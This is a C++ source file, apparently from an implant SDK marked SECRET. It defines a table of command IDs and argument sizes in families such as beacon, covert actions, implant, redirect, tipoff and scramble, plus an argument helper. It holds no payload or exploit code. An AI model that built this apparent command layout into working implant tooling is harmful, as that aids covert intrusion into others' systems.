/*-****************************************************************************
$Archive: SinnerTwin/JY008C637-ILM_SDK/source/Primitive_ref.cpp$
$Revision: 1$
$Date: Monday, February 01, 2010 6:04:35 PM$
$Author: timm$
Template: cpp_file.cpp 3.0
*******************************************************************************

                        CPRCLASS = "SECRET"

*******************************************************************************
*/

/*-----------------  Primitive_ref - FILE DESCRIPTION  -----------------*

Implementation of the static master reference table found in the Primitive
namespace.  The reference table is implemented here in a
separate compilation module to facilitate better control of this important
interface characteristic.

*/
/* $NoKeywords$ (No rcs replacement keywords below this point) */


/*-----------------  Primitive_ref - INCLUDES  -------------------------*/

#include "Primitive.h"
#include "ProcessCmdResponse.h"

/*-----------------  Primitive_ref - DECLARATIONS ----------------------*/

using namespace InterfaceLibrary;

/*==========================================================================*/

// refTable entries must be ordered by the first column, the numeric ID.
Primitive::RefTableEntry Primitive::refTable[] = {
   // beacon family
   {0x00000000, 0, false, NULL, NULL},
   {0x00000001, 0, false, NULL, NULL},
   {0x00000002, 0, false, NULL, NULL},
   {0x00000003, 0, false, NULL, NULL},
   {0x00000004, 0, false, NULL, NULL},
   {0x00000005, 0, false, NULL, NULL},
   {0x00000006, 0, false, NULL, NULL},
   {0x00000007, sizeof(uint32), false, NULL, NULL},
   {0x00000008, sizeof(uint32), false, NULL, NULL},
   {0x00000009, sizeof(uint32), false, NULL, NULL},
   {0x0000000A, sizeof(uint32), false, NULL, NULL},
   {0x0000000B, sizeof(uint32), false, NULL, NULL},
   {0x0000000C, sizeof(uint32), false, NULL, NULL},
   {0x0000000D, sizeof(uint32), false, NULL, NULL},
   {0x0000000E, sizeof(uint32), false, NULL, NULL},
   {0x0000000F, 0, false, NULL, NULL},

   // covert actions family
   {0x01000000, 0, false, NULL, NULL},
   {0x01000001, 0, false, NULL, NULL},
   {0x01000002, 0, false, NULL, NULL},
   {0x01000003, sizeof(uint32) * 2, false, NULL, NULL},
   {0x01000004, sizeof(uint32), false, NULL, NULL},
   {0x01000005, sizeof(uint32), false, NULL, NULL},
   {0x01000006, sizeof(String), false, NULL, NULL},
   {0x01000007, sizeof(String), false, NULL, NULL},
   {0x01000008, sizeof(uint32), false, NULL, NULL},

   // file family
   {0x02000000, 0, false, NULL, NULL},
   {0x02000001, 0, false, NULL, NULL},
   {0x02000002, 0, false, NULL, NULL},
   {0x02000003, sizeof(String) * 2, false, NULL, NULL},
   {0x02000004, sizeof(String), false, NULL, NULL},
   {0x02000005, sizeof(String), false, NULL, NULL},
   {0x02000006, sizeof(String) * 2, false, NULL, NULL},
   {0x02000007, sizeof(String), false, NULL, NULL},
   {0x02000008, 0, false, NULL, NULL},
   {0x02000009, sizeof(String) * 2, false, NULL, NULL},

   // ILM family
   {0x03000000, 0, false, NULL, NULL},
   {0x03000001, 0, false, NULL, NULL},
   {0x03000002, sizeof(String), false, NULL, NULL},
   {0x03000003, sizeof(String), false, NULL, NULL},
   {0x03000004, sizeof(String), false, NULL, NULL},
   {0x03000005, 0, false, NULL, NULL},
   {0x03000006, sizeof(uint32), false, NULL, NULL},
   {0x03000007, sizeof(uint32), false, NULL, NULL},
   {0x03000008, 0, false, NULL, NULL},
   {0x03000009, sizeof(uint32) * 2, false, NULL, NULL},


   // implant family
   {0x04000000, 0, false, NULL, NULL},
   {0x04000001, 0, false, NULL, NULL},
   {0x04000002, 0, false, NULL, NULL},
   {0x04000003, sizeof(uint32), false, NULL, NULL},
   {0x04000004, 0, false, NULL, NULL},
   {0x04000005, 0, false, NULL, NULL},
   {0x04000006, 0, false, NULL, NULL},
   {0x04000007, sizeof(String), false, NULL, NULL},

   // interface family
   {0x05000000, 0, false, NULL, NULL},
   {0x05000001, 0, false, NULL, NULL},
   {0x05000002, 0, false, NULL, NULL},
   {0x05000003, sizeof(String), false, NULL, NULL},

   // memory family
   {0x06000000, 0, false, NULL, NULL},
   {0x06000001, 0, false, NULL, NULL},
   {0x06000002, 0, false, NULL, NULL},
   {0x06000003, sizeof(uint32), false, NULL, NULL},
   {0x06000004, sizeof(uint64), false, NULL, NULL},
   {0x06000005, sizeof(uint64) + sizeof(uint32), false, NULL, NULL},
   {0x06000006, sizeof(binary) + sizeof(uint64) + sizeof(uint32), false, NULL, NULL},
   {0x06000007, sizeof(uint64), false, NULL, NULL},
   {0x06000008, sizeof(String) + sizeof(uint64) + sizeof(uint32), false, NULL, NULL},
   {0x06000009, sizeof(String) + sizeof(binary) + sizeof(uint64) + sizeof(uint32), false, NULL, NULL},

   // module family
   {0x07000000, 0, false, NULL, NULL},
   {0x07000001, 0, false, NULL, NULL},
   {0x07000002, 0, false, NULL, NULL},
   {0x07000003, sizeof(String) * 2, false, NULL, NULL},
   {0x07000004, sizeof(String), false, NULL, NULL},
   {0x07000005, sizeof(String), false, NULL, NULL},
   {0x07000006, sizeof(String), false, NULL, NULL},
   {0x07000007, sizeof(String), false, NULL, NULL},
   {0x07000008, sizeof(String), false, NULL, NULL},
   {0x07000009, sizeof(String), false, NULL, NULL},
   {0x0700000A, sizeof(String), false, NULL, NULL},
   {0x0700000B, sizeof(String), false, NULL, NULL},
   {0x0700000C, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0700000D, sizeof(String), false, NULL, NULL},
   {0x0700000E, sizeof(String), false, NULL, NULL},
   {0x0700000F, sizeof(String), false, NULL, NULL},

   // native family
   {0x08000000, 0, false, NULL, NULL},
   {0x08000001, 0, false, NULL, NULL},
   {0x08000002, 0, false, NULL, NULL},
   {0x08000003, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x08000004, sizeof(uint32) * 2, false, NULL, NULL},

   // packet assist family
   {0x09000000, 0, false, NULL, NULL},
   {0x09000001, 0, false, NULL, NULL},
   {0x09000002, 0, false, NULL, NULL},
   {0x09000003, sizeof(String), false, NULL, NULL},
   {0x09000004, sizeof(String), false, NULL, NULL},

   // packet family
   {0x0A000000, 0, false, NULL, NULL},
   {0x0A000001, 0, false, NULL, NULL},
   {0x0A000002, 0, false, NULL, NULL},
   {0x0A000003, sizeof(String), false, NULL, NULL},
   {0x0A000004, sizeof(String), false, NULL, NULL},

   // process family
   {0x0B000000, 0, false, NULL, NULL},
   {0x0B000001, 0, false, NULL, NULL},
   {0x0B000002, 0, false, NULL, NULL},
   {0x0B000003, 0, false, NULL, NULL},
   {0x0B000004, 0, false, NULL, NULL},
   {0x0B000005, sizeof(String), false, NULL, NULL},

   // redirect family
   {0x0C000000, 0, false, NULL, NULL},
   {0x0C000001, 0, false, NULL, NULL},
   {0x0C000002, 0, false, NULL, NULL},
   {0x0C000003, sizeof(uint32) + (sizeof(String) * 14), false, NULL, NULL},
   {0x0C000004, sizeof(String), false, NULL, NULL},
   {0x0C000005, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000006, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000007, sizeof(String), false, NULL, NULL},
   {0x0C000008, sizeof(String) + (sizeof(uint32) * 13), false, NULL, NULL},
   {0x0C000009, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C00000A, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C00000B, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C00000C, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C00000D, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C00000E, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C00000F, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000010, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000011, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000012, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000013, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0C000014, sizeof(String) + sizeof(uint32), false, NULL, NULL},

   // socket family
   {0x0D000000, 0, false, NULL, NULL},
   {0x0D000001, 0, false, NULL, NULL},
   {0x0D000002, 0, false, NULL, NULL},
   {0x0D000003, sizeof(String), false, NULL, NULL},
   {0x0D000004, sizeof(String), false, NULL, NULL},
   {0x0D000005, sizeof(String) + sizeof(uint32), false, NULL, NULL},

   // tipoff family
   {0x0E000000, 0, false, NULL, NULL},
   {0x0E000001, 0, false, NULL, NULL},
   {0x0E000002, 0, false, NULL, NULL},
   {0x0E000003, sizeof(String), false, NULL, NULL},
   {0x0E000004, sizeof(String) * 14, false, NULL, NULL},
   {0x0E000005, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0E000006, sizeof(uint32), false, NULL, NULL},
   {0x0E000007, sizeof(String), false, NULL, NULL},
   {0x0E000008, sizeof(String), false, NULL, NULL},
   {0x0E000009, sizeof(String), false, NULL, NULL},
   {0x0E00000A, sizeof(String) * 2, false, NULL, NULL},
   {0x0E00000B, sizeof(String) + sizeof(uint32), false, NULL, NULL},

   // scramble family
   {0x0F000000, 0, false, NULL, NULL},
   {0x0F000001, 0, false, NULL, NULL},
   {0x0F000002, sizeof(String), false, NULL, NULL},
   {0x0F000003, (sizeof(String) * 3) + (sizeof(uint32) * 16), false, NULL, NULL},
   {0x0F000004, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000005, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000006, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000007, sizeof(String) + sizeof(uint32), false, NULL, NULL},
   {0x0F000008, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000009, sizeof(String), false, NULL, NULL},
   {0x0F00000A, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F00000B, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F00000C, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F00000D, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F00000E, sizeof(String), false, NULL, NULL},
   {0x0F00000F, sizeof(String), false, NULL, NULL},
   {0x0F000010, sizeof(String), false, NULL, NULL},
   {0x0F000011, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000012, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000013, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000014, sizeof(String), false, NULL, NULL},
   {0x0F000015, sizeof(String) + (sizeof(uint32) * 2), false, NULL, NULL},
   {0x0F000016, sizeof(String) + sizeof(uint32), false, NULL, NULL},

   // capability family
   {0x10000000, sizeof(uint32), false, NULL, NULL},

   // system family
   {0x11000000, sizeof(uint32), false, NULL, NULL},

   // tun family
   {0x12000000, 0, false, NULL, NULL},
   {0x12000001, sizeof(String), false, NULL, NULL},
   {0x12000002, sizeof(String), false, NULL, NULL},
   {0x12000003, sizeof(String), false, NULL, NULL},
   {0x12000004, sizeof(String), false, NULL, NULL},
   {0x12000005, sizeof(String), false, NULL, NULL},

   {0xffffffff, 0, false, NULL, NULL}   // Special end-of-table entry; must be last.
};

bool ProcessCmdAccumulator::SupplementArgument (String& val, const std::string& keyname, ProcessCmdResponse& resp)
{
   if (val.Length()==0) {
      iterator i = find(keyname);
      if (i==end()) {
         resp.resultsLines.push_back(ProcessCmdResponse::Line(0, (std::string("No '")+keyname+"' argument.").c_str()));
         resp.type = ProcessCmdResponse::TYPE_Local_Failure;
         return false;
      }
      val = i->second;
   } else {
      (*this)[keyname] = (const char*)val;
   }
   return true;
}

//-----------------------------------------------------------------------------
//
//	SECRET		SECRET		SECRET		SECRET
//
//-----------------------------------------------------------------------------
